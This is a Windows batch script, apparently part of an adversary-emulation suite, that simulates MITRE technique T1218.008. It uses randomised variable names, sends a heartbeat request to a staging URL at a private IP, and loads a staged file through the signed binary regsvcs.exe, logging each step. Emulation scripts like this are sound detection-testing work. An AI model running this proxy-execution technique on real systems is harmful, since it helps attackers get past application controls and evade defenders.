@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8527\e0bc2b3e
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8527-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=onenote.txt
SET ewjmdkff=8527
SET wddxz=%APPDATA%\%pudaazx%
SET fpfka=%APPDATA%\%pudaazx%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_started=>> "%fpfka%" 2>nul
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_start=>> "%fpfka%" 2>nul
curl -k -s -o nul "%drguvr%"
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_complete=>> "%fpfka%" 2>nul
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_target=%pjkcpgw%>> "%fpfka%" 2>nul
cd /d "%pjkcpgw%" >nul 2>&1
IF NOT ERRORLEVEL 1 (
    SET gxbxr=1
    SET zyefb=
) ELSE (
    SET gxbxr=0
    SET zyefb=access_denied
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_result=!gxbxr!>> "%fpfka%" 2>nul
IF EXIST "%syjfr%" (
    SET lkzrq=1
    SET bpvwf=
    SET lclfx=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
    echo [%DATE% %TIME%][DEBUG][%hlbnp%]: regsvcs_start=%lclfx%>> "%fpfka%" 2>nul
    "%lclfx%" "%syjfr%"
    IF NOT ERRORLEVEL 1 (
        SET cbzxt=1
        SET nfqrg=
    ) ELSE (
        SET cbzxt=0
        SET nfqrg=regsvcs_failed
    )
) ELSE (
    SET cbzxt=0
    SET nfqrg=file_not_found
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: regsvcs_result=!cbzxt!>> "%fpfka%" 2>nul
echo [%DATE% %TIME%][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218.008|Signed Binary Proxy Execution: Regsvcs=!cbzxt!:!nfqrg!>> "%fpfka%" 2>nul
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_complete=>> "%fpfka%" 2>nul
ENDLOCAL